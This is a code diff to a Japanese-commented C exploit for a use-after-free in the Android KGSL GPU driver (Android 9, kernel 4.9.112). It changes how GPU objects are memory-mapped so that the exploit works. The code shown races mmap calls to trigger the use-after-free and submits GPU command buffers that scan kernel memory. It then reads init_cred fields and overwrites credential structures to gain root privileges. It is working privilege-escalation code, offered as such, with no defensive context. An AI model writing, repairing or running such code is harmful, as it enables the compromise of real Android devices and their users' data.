@@ -1,4 +1,4 @@
-// exploit.c – KGSL UAF 権限昇格 (Android 9 / kernel 4.9.112) – 修正版
+// exploit.c – KGSL UAF 権限昇格 (Android 9 / kernel 4.9.112) – 修正版 (gpuaddr 使用)
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -95,8 +95,8 @@ static uint64_t kaslr_offset = 0;
 static void die(const char *msg);
 static uint64_t detect_kaslr(void);
 static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags);
-static void *gpuobj_mmap_safe(int fd, size_t size, unsigned int id, void *addr, int flags);
 static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags);
+static void *gpuobj_mmap_gpuaddr(int fd, size_t size, uint64_t gpuaddr, void *addr, int flags);
 static void gpuobj_free(int fd, unsigned int id);
 static unsigned int create_context(int fd);
 static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target);
@@ -219,21 +219,6 @@ static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     return a.id;
 }
 
-static void *gpuobj_mmap_safe(int fd, size_t size, unsigned int id, void *addr, int flags) {
-    uint64_t offset = (uint64_t)id * 4096;
-    if (offset > INT64_MAX) {
-        fprintf(stderr, "[-] Offset 0x%lx too large for off_t\n", offset);
-        return MAP_FAILED;
-    }
-    void *p = mmap(addr, size, PROT_READ | PROT_WRITE,
-                   flags, fd, (off_t)offset);
-    if (p == MAP_FAILED) {
-        fprintf(stderr, "mmap(addr=%p, size=0x%zx, off=0x%lx) failed: %s (errno=%d)\n",
-                addr, size, offset, strerror(errno), errno);
-    }
-    return p;
-}
-
 static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
     struct kgsl_gpuobj_info inf = { .id = id };
     int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
@@ -242,6 +227,18 @@ static int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *fla
         if (flags) *flags = inf.flags;
     }
     return ret;
+}
+
+// mmap で offset に gpuaddr を使用 (id ではない)
+static void *gpuobj_mmap_gpuaddr(int fd, size_t size, uint64_t gpuaddr, void *addr, int flags) {
+    // gpuaddr をそのまま offset として使用 (64bit 対応)
+    void *p = mmap(addr, size, PROT_READ | PROT_WRITE,
+                   flags, fd, (off_t)gpuaddr);
+    if (p == MAP_FAILED) {
+        fprintf(stderr, "mmap(addr=%p, size=0x%zx, off=0x%lx) failed: %s (errno=%d)\n",
+                addr, size, gpuaddr, strerror(errno), errno);
+    }
+    return p;
 }
 
 static void gpuobj_free(int fd, unsigned int id) {
@@ -328,16 +325,18 @@ int main(int argc, char **argv) {
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
 
     int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
-    printf("  uaf_id = %u (0x%x)\n", uaf_id, uaf_id);
+    uint64_t uaf_gpuaddr = 0;
+    if (gpuobj_info(kgsl_fd, uaf_id, &uaf_gpuaddr, NULL) < 0) die("gpuobj_info uaf");
+    printf("  uaf_id = %u, gpuaddr = 0x%lx\n", uaf_id, (unsigned long)uaf_gpuaddr);
 
     // 既存マッピング解除
     munmap((void*)UAF_ADDR, UAF_SIZE);
 
-    void *uaf_m = gpuobj_mmap_safe(kgsl_fd, UAF_SIZE, uaf_id, (void*)UAF_ADDR,
-                                   MAP_SHARED | MAP_FIXED);
+    void *uaf_m = gpuobj_mmap_gpuaddr(kgsl_fd, UAF_SIZE, uaf_gpuaddr, (void*)UAF_ADDR,
+                                      MAP_SHARED | MAP_FIXED);
     if (uaf_m == MAP_FAILED) {
         printf("[*] Retrying without MAP_FIXED...\n");
-        uaf_m = gpuobj_mmap_safe(kgsl_fd, UAF_SIZE, uaf_id, NULL, MAP_SHARED);
+        uaf_m = gpuobj_mmap_gpuaddr(kgsl_fd, UAF_SIZE, uaf_gpuaddr, NULL, MAP_SHARED);
         if (uaf_m == MAP_FAILED) die("mmap UAF (retry)");
         UAF_ADDR = (uint64_t)uaf_m;
         printf("[+] UAF mapped at 0x%lx (without FIXED)\n", (unsigned long)UAF_ADDR);
@@ -349,8 +348,10 @@ int main(int argc, char **argv) {
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
     int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = gpuobj_mmap_safe(kgsl_fd, PLACEHOLDER_SIZE, ph_id, (void*)PLACEHOLDER_ADDR,
-                                  MAP_SHARED | MAP_FIXED);
+    uint64_t ph_gpuaddr = 0;
+    if (gpuobj_info(kgsl_fd, ph_id, &ph_gpuaddr, NULL) < 0) die("gpuobj_info ph");
+    void *ph_m = gpuobj_mmap_gpuaddr(kgsl_fd, PLACEHOLDER_SIZE, ph_gpuaddr, (void*)PLACEHOLDER_ADDR,
+                                     MAP_SHARED | MAP_FIXED);
     if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
 
     printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
@@ -360,6 +361,8 @@ int main(int argc, char **argv) {
     // 4. レース
     printf("[*] Phase 2: Race\n");
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
+    uint64_t ov_gpuaddr = 0;
+    if (gpuobj_info(kgsl_fd, ov_id, &ov_gpuaddr, NULL) < 0) die("gpuobj_info ov");
 
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
@@ -368,7 +371,7 @@ int main(int argc, char **argv) {
     for (int i = 0; i < 5000000; i++) {
         void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-            kgsl_fd, (off_t)ov_id << 12);
+            kgsl_fd, (off_t)ov_gpuaddr);
         int e = errno;
         if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
         if (e == ENODEV) { hit = 1; break; }
@@ -435,16 +438,18 @@ int main(int argc, char **argv) {
     printf("  context=%u\n", ctx_id);
 
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
-    void *ib_m = gpuobj_mmap_safe(kgsl_fd, 0x10000, ib_id, NULL, MAP_SHARED);
+    uint64_t ib_gpuaddr = 0;
+    if (gpuobj_info(kgsl_fd, ib_id, &ib_gpuaddr, NULL) < 0) die("gpuobj_info ib");
+    void *ib_m = gpuobj_mmap_gpuaddr(kgsl_fd, 0x10000, ib_gpuaddr, NULL, MAP_SHARED);
     if (ib_m == MAP_FAILED) die("mmap IB");
-    uint64_t ib_ga = 0; gpuobj_info(kgsl_fd, ib_id, &ib_ga, NULL);
-    printf("  IB gpuaddr=0x%lx\n", (unsigned long)ib_ga);
+    printf("  IB gpuaddr=0x%lx\n", (unsigned long)ib_gpuaddr);
 
     int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
-    void *dst_m = gpuobj_mmap_safe(kgsl_fd, 0x4000, dst_id, NULL, MAP_SHARED);
+    uint64_t dst_gpuaddr = 0;
+    if (gpuobj_info(kgsl_fd, dst_id, &dst_gpuaddr, NULL) < 0) die("gpuobj_info dst");
+    void *dst_m = gpuobj_mmap_gpuaddr(kgsl_fd, 0x4000, dst_gpuaddr, NULL, MAP_SHARED);
     if (dst_m == MAP_FAILED) die("mmap DST");
-    uint64_t dst_ga = 0; gpuobj_info(kgsl_fd, dst_id, &dst_ga, NULL);
-    printf("  DST gpuaddr=0x%lx\n", (unsigned long)dst_ga);
+    printf("  DST gpuaddr=0x%lx\n", (unsigned long)dst_gpuaddr);
 
     uint64_t scan_start = UAF_ADDR + 0x300000;
     uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
@@ -461,7 +466,7 @@ int main(int argc, char **argv) {
         cmd[dw++] = cp_type7(CP_NOP, 0);
         for (int i = 0; i < SCAN_DWORDS; i++) {
             uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i*4, &dl, &dh);
+            split64(dst_gpuaddr + i*4, &dl, &dh);
             split64(va + i*4, &sl, &sh);
             cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
             cmd[dw++] = 0;
@@ -471,7 +476,7 @@ int main(int argc, char **argv) {
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) < 0) break;
         if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
         __sync_synchronize();
 
@@ -506,7 +511,7 @@ int main(int argc, char **argv) {
         int dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
         uint32_t dl, dh, sl, sh;
-        split64(dst_ga, &dl, &dh);
+        split64(dst_gpuaddr, &dl, &dh);
         split64(init_cred_addr + 0x78, &sl, &sh);  // cred->security
         cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
         cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
@@ -514,7 +519,7 @@ int main(int argc, char **argv) {
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
+        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) == 0) {
             wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             inc_sec = *(uint64_t *)dst_m;
@@ -553,7 +558,7 @@ int main(int argc, char **argv) {
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+        if (submit_ib(kgsl_fd, ctx_id, ib_gpuaddr, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
         __sync_synchronize();
         printf("  CRED[%d] written\n", p);
